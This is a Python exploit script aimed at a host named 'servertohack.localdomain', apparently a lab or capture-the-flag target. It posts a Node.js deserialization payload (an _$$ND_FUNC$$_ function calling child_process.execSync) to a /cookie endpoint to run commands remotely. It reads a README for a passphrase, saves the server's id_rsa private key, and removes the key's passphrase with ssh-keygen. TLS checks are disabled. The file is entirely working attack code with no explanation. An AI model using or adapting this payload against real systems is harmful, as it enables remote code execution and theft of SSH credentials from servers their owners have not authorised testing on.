#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib
import json
import os
import sys


#
# Variables
#

debugOrNot = False
target_hostname = 'servertohack.localdomain'
target_proto = 'https'
base_url = target_proto + '://' + target_hostname


#
# Debug
#

def myDebug(param):
  if debugOrNot == True:
    print(param)


#
# requestDebug
#

def requestDebug(s, req):
  prepared = req.prepare()
  myDebug('-----------REQUEST-----------')
  myDebug(prepared.method + ' ' + prepared.url)
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in prepared.headers.items()))
  if prepared.body != None:
    myDebug('\n' + prepared.body)
  r = s.send(prepared)
  r.encoding = 'UTF-8'
  myDebug('\n-----------RESPONSE-----------')
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in r.headers.items()) + '\n')
  return r


#
# Main
#

s = requests.Session()
s.verify = False

headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
  'Accept-Encoding': 'none',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Host': target_hostname.split('.')[0]
}


#
# NodeJS injection
#

payload = '{ "payload": "_$$ND_FUNC$$_function(){ var result = require(\'child_process\').execSync(\'cat README.md\'); return result.toString(); }()" }'
req = requests.Request('POST', base_url + '/cookie', headers=headers, data=payload)
r = requestDebug(s, req)
passphrase = r.text.split('\\r\\n')[-3].split()[2]
print(passphrase)


#
# Get id_rsa
#

payload = '{ "payload": "_$$ND_FUNC$$_function(){ var result = require(\'child_process\').execSync(\'cat id_rsa\'); return result.toString(); }()" }'
req = requests.Request('POST', base_url + '/cookie', headers=headers, data=payload)
r = requestDebug(s, req)
with open('id_rsa', 'w') as f:
  os.chmod('id_rsa', 0o600)
  f.write(json.loads(r.text)['payload'])
os.system('ssh-keygen -q -p -P ' + passphrase + ' -N "" -f id_rsa 1>/dev/null 2>&1')
